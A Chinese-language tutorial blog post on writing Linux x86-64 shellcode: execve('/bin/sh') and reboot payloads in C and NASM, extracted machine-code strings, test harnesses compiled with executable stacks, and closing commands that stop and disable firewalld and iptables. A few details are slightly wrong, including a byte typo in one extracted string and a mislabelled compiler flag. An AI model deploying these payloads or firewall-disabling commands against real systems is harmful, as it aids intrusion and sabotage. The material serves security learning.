[TOC]

## 1. 打开 terminal

首先我们来试试最经典的例子 ---- 打开 terminal

那么问题来了用c语言该怎么写？

>   int execve(const char \****filename***, char \*const **argv**[], char \*const **envp**[]);
>
>   filename:	要执行的程序
>
>   argv[]：传递给新程序的参数字符串数组
>
>   envp[]:	传递给新程序的环境变量字符串数组

### 1.1 C语言版本

```c
#include<stdio.h>
#include <stdlib.h>

int main()
{
	char *name[2];
	name[0] = "bin/sh";
	name[1] = 0x0;

	execve(name[0], name, NULL);
	exit(0);
}
```

用gcc编译一下，看看能否运行？

-   -z execstack 关闭canary
-   -g 添加信息，便于gdb调试

```shell
gcc getTerminal.c -o terminal -z execstack -g
./terminal
```

![image-20220806232610222](Linux_shellcode开发之实战/image-20220806232610222.png)

可以看到程序成功执行，说明我们的思路没有问题。



### 1.2 写汇编

从上面可以看到，这个 execve("bin/sh", ["bin/sh"], NULL) 参数是没有问题的，根据 execve 的系统调用号 0x3b 来布置函数栈帧。

```asm
global _start
section .text
 
_start:
	; execve("/bin/sh", ["/bin/sh"], NULL)
	; rax = 0x3b, rdx= NULL, rdi = '//bin/sh', rsi = '//bin/sh'
	xor		rdx, rdx
	mov		qword rbx, '//bin/sh'		; 0x68732f6e69622f2f
	shr		rbx, 0x8
	push		rbx
	mov		rdi, rsp
	push		rax
	push		rdi
	mov		rsi, rsp
	mov		al, 0x3b
	syscall
```

编译运行：

```shell
$ nasm -f elf64 execve_sh64.asm 
$ ld -m elf_x86_64 execve_sh64.o -o execve_sh64 
$ ./execve_sh64 
```

![image-20220807220010173](Linux_shellcode开发之实战/image-20220807220010173.png)



### 1.3 提取机器码

```shell
sakura@Kylin:~/文档/execveDir$ objdump -d execve_sh64

execve_sh64：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:	48 31 d2             	xor    %rdx,%rdx
  401003:	48 bb 2f 2f 62 69 6e 	movabs $0x68732f6e69622f2f,%rbx
  40100a:	2f 73 68 
  40100d:	48 c1 eb 08          	shr    $0x8,%rbx
  401011:	53                   	push   %rbx
  401012:	48 89 e7             	mov    %rsp,%rdi
  401015:	50                   	push   %rax
  401016:	57                   	push   %rdi
  401017:	48 89 e6             	mov    %rsp,%rsi
  40101a:	b0 3b                	mov    $0x3b,%al
  40101c:	0f 05                	syscall 

"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" 
```



### 1.4 测试

将机器码嵌入C语言运行。

```c
#include <stdio.h>
#include <string.h>


int main()
{
    const char shellcode[] =  "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
    //当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度
    printf("Shellcode length: %d bytes\n",strlen(shellcode));
    (*(void(*)())shellcode)();
}
```

编译运行：

```shell
$ gcc execve_sh64.c -o execve_sh64 -z execstack -z norelro -no-pie -g
$ ./execve_sh64
```

成功执行。

![image-20220807230925573](Linux_shellcode开发之实战/image-20220807230925573.png)



## 2. 重启 reboot

### 2.1 找到指令位置

首先，查看 reboot 命令所在位置。

```shell
$ whereis reboot
reboot: /usr/sbin/reboot /usr/share/man/man8/reboot.8.gz
```

用此路径（/usr/sbin/reboot）作为参数，进行系统调用。

```asm
global _start
section .text
 
_start:
	; execve("/usr/sbin/reboot", ["/usr/sbin/reboot"], NULL)
	; rax = 0x3b, rdx= NULL, rdi = '/usr/sbin/reboot', rsi = '/usr/sbin/reboot'
	xor		rdx, rdx
	push  	rdx
	mov		rbx, 'n/reboot'
	push		rbx
	mov 	rbx, '/usr/sbi'
	push 		rbx
	mov		rdi, rsp
	push		rax
	push		rdi
	mov		rsi, rsp
	mov		al, 0x3b
	syscall
```

### 2.2 编译链接运行

```shell
$ nasm -f elf64 execve_reboot.asm
$ ld -m elf_x86_64 execve_reboot.o -o execve_reboot
$ ./execve_reboot
```

然后就重启了。

### 2.3 提取机器码

```shell
$ objdump -d execve_reboot 

execve_reboot：     文件格式 elf64-x86-64

Disassembly of section .text:

0000000000401000 <_start>:
  401000:	48 31 d2             	xor    %rdx,%rdx
  401003:	52                   	push   %rdx
  401004:	48 bb 6e 2f 72 65 62 	movabs $0x746f6f6265722f6e,%rbx
  40100b:	6f 6f 74 
  40100e:	53                   	push   %rbx
  40100f:	48 bb 2f 75 73 72 2f 	movabs $0x6962732f7273752f,%rbx
  401016:	73 62 69 
  401019:	53                   	push   %rbx
  40101a:	48 89 e7             	mov    %rsp,%rdi
  40101d:	50                   	push   %rax
  40101e:	57                   	push   %rdi
  40101f:	48 89 e6             	mov    %rsp,%rsi
  401022:	b0 3b                	mov    $0x3b,%al
  401024:	0f 05                	syscall 
```

```
"\x48\x31\xd2\x52\x48\xbb\x6e\x2f\x72\x65\x62\x6f\x6f\x74\x53\x48\xbb\x2f\x75\x73\x72\x2f\x73\x62\x69\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
```



### 2.4 测试

将机器码嵌入c语言运行。

```c
#include <stdio.h>
#include <string.h>

int main()
{
    const char shellcode[] =  "\x48\x31\xd2\x52\x48\xbb\x6e\x2f\x72\x65\x62\x6f\x6f\x74\x53\x48\xbb\x2f\x75\x73\x72\x2f\x73\x62\x69\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
    //当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度
    printf("Shellcode length: %d bytes\n",strlen(shellcode));
    (*(void(*)())shellcode)();
}
```

编译运行：

```shell
$ gcc execve_reboot.c -o execve_reboot -z execstack -z norelro -no-pie -g
$ ./execve_reboot
```

成功重启。



## 3 关闭防火墙

与防火墙相关的指令，转载于：[Linux关闭防火墙命令](https://www.cnblogs.com/jxldjsn/p/10794171.html)

```shell
1:查看防火状态
systemctl status firewalld
service  iptables status

2:暂时关闭防火墙
systemctl stop firewalld
service  iptables stop

3:永久关闭防火墙
systemctl disable firewalld
chkconfig iptables off

4:重启防火墙
systemctl enable firewalld
service iptables restart 

5:永久关闭后重启
//暂时还没有试过
chkconfig iptables on
```

